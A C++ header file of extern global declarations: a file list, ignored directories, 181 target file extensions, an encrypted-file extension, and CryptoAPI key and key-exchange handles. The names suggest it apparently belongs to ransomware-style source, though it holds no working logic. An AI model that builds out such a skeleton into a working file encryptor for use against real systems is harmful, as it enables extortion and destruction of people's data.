#include "stdafx.h"
extern std::vector<std::wstring> filesDB;
extern _WIN32_FIND_DATAW curItem;
extern TCHAR curPath[MAX_PATH];
extern LPWSTR ignoreDirs[14];
extern LPWSTR fileExts[181];
const extern std::wstring encExt;
extern HCRYPTKEY keyHandle;
extern HCRYPTKEY xchgKeyHandle;
extern DWORD keyBlobLen;
extern HCRYPTPROV provPtr;
extern std::wstring keyContainerPath;
extern BOOL action;